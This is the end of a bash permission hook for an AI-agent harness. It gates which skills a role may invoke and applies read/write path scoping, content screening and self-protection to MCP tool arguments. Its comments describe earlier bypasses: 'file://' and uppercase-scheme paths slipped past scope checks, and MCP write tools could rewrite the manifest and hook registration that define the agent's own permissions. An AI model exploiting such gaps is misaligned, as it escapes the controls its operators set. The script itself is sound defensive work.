  DISPATCH_NONCE=$(printf '%s' "$PROMPT" | grep -oE "<<harness-os-role: ${TARGET_ROLE}#[a-z0-9]{4,}>>" \
    | head -n1 | sed -E 's/.*#([a-z0-9]+)>>$/\1/' || true)
  [ -n "$TARGET_ROLE" ] && harness_os_register_dispatch "$TARGET_ROLE" "$HOS_TOOL_USE_ID" "$DISPATCH_NONCE"
fi

# --- Axis 7: skill gate --------------------------------------------------
if [ "$HOS_TOOL" = "Skill" ]; then
  SKILLS_ALLOW=$(harness_os_role_field "$ROLE" '.skills.allow')
  if [ "$SKILLS_ALLOW" != "null" ]; then
    SKILL_NAME=$(printf '%s' "$INPUT" | "$JQ" -r '.tool_input.skill // ""' 2>/dev/null || echo "")
    if ! tool_matches_any "$SKILL_NAME" "$SKILLS_ALLOW"; then
      harness_os_deny "skill-not-allowed $SKILL_NAME" "[BLOCKED] Role '${ROLE}' may not invoke the skill '${SKILL_NAME}'.

${ROLE_HEADER}
Granted skills: $(printf '%s' "$SKILLS_ALLOW" | "$JQ" -r 'join(", ")' 2>/dev/null)"
    fi
  fi
fi

# --- Axis 8: MCP argument path-scoping -----------------------------------
# Core tools name their paths in known fields (file_path, path, …), so
# axes 4-5 can scope them. An MCP tool's argument shape is its own, so
# the manifest teaches the kernel which arguments of which tools carry
# paths (settings.mcpPathArguments), and those paths are then held to the
# SAME read/write scopes as the core tools. Without a mapping entry, an
# MCP tool remains gated by name only (axis 2) — which is why the
# architecture doc tells you to grant file-mutating MCP tools only to
# roles whose mandate covers the effect.
MCP_MAP=$(printf '%s' "$HOS_MANIFEST_JSON" | "$JQ" -c '.settings.mcpPathArguments // {}' 2>/dev/null || echo "{}")
if [ "$MCP_MAP" != "{}" ] && [ -n "$MCP_MAP" ]; then
  # Which mapping entries apply to this tool name (shell-glob match)?
  MCP_FIELDS_READ=""
  MCP_FIELDS_WRITE=""
  while IFS= read -r pat; do
    [ -n "$pat" ] || continue
    # shellcheck disable=SC2254
    case "$HOS_TOOL" in
      $pat)
        MCP_FIELDS_READ="$MCP_FIELDS_READ$(printf '%s' "$MCP_MAP" | "$JQ" -r --arg p "$pat" '(.[$p].read // [])[]' 2>/dev/null)"$'\n'
        MCP_FIELDS_WRITE="$MCP_FIELDS_WRITE$(printf '%s' "$MCP_MAP" | "$JQ" -r --arg p "$pat" '(.[$p].write // [])[]' 2>/dev/null)"$'\n'
        ;;
    esac
  done < <(printf '%s' "$MCP_MAP" | "$JQ" -r 'keys[]' 2>/dev/null)

  # scope_mcp_field <axis:read|write> <dot-path> — pull the value(s) at
  # tool_input.<dot-path> (array values are checked element-wise) and run
  # each through the same scope check the core tools use.
  scope_mcp_field() {
    local axis="$1" field="$2" vals
    [ -n "$field" ] || return 0
    vals=$(printf '%s' "$INPUT" | "$JQ" -r --arg f "$field" '
      def pick($o; $parts): reduce $parts[] as $k ($o; if . == null then null else .[$k]? end);
      (.tool_input // {}) as $ti
      | pick($ti; ($f | split(".")))
      | if . == null then empty
        elif type == "array" then .[] | select(type == "string")
        elif type == "string" then .
        else empty end' 2>/dev/null || echo "")
    local v
    while IFS= read -r v; do
      [ -n "$v" ] || continue
      # Only a genuinely REMOTE scheme is exempt. `file://` names a local
      # path, so it is unwrapped and scoped — skipping anything merely
      # containing "://" let `file://secret` past the very check the
      # manifest configured.
      # The scheme test is the SHARED one, case-insensitive, because
      # this list was the third lowercase copy and all three agreed on
      # being wrong: RFC 3986 says a scheme is case-insensitive, so
      # `HTTP://…` was a URL to every client and to none of these lists.
      harness_os_is_network_url "$v" && continue
      case "$v" in
        data:*|DATA:*|Data:*) continue ;;
        file://*|FILE://*|File://*) v="${v#*://}"; [ "${v#/}" = "$v" ] && v="/$v" ;;
      esac
      harness_os_is_manifest_path "$v" && [ "$axis" = "read" ] && continue
      # Self-protection, on the third write channel. It had been attached
      # to tool NAMES — the Write/Edit arm and the Bash arm — rather than
      # to the act of writing, so a mapped MCP write tool reached the
      # manifest, the role bindings and the hook registration untouched
      # by any of it. This axis held the path to the role's write scope
      # and stopped there, which is not enough: a config role whose scope
      # legitimately covers `.claude/**` could rewrite the file that says
      # what it may do, and then everything else follows.
      [ "$axis" = "write" ] && self_protect_target "$v" "self-protect mcp write via ${HOS_TOOL}"
      # And the code screen, for the same reason. Round 22 moved
      # SELF-PROTECTION off tool names and onto the act of writing, and
      # stopped there — so a mapped MCP write remained a third authoring
      # route with no content screen of any kind, while the Bash channel
      # refuses to author an executable at all on the grounds that only
      # Write and Edit can screen the content. Two channels screened the
      # bytes; the third was told it could not author code and the third
      # was never asked.
      if [ "$axis" = "write" ]; then
        MCP_CONTENT=$(printf '%s' "$INPUT" | "$JQ" -r '
          (.tool_input // {}) | (.content // .contents // .text // .body // .data // empty)
          | if type == "string" then . else empty end' 2>/dev/null || echo "")
        [ -n "$MCP_CONTENT" ] && check_code_capabilities "$v" "$MCP_CONTENT"
      fi
      check_path_scope "$axis" "$(harness_os_relpath "$v")" \
        "$([ "$axis" = "write" ] && echo "write" || echo "read") via ${HOS_TOOL}"
    done <<< "$vals"
  }

  while IFS= read -r field; do scope_mcp_field read "$field"; done <<< "$MCP_FIELDS_READ"
  while IFS= read -r field; do scope_mcp_field write "$field"; done <<< "$MCP_FIELDS_WRITE"
fi

exit 0
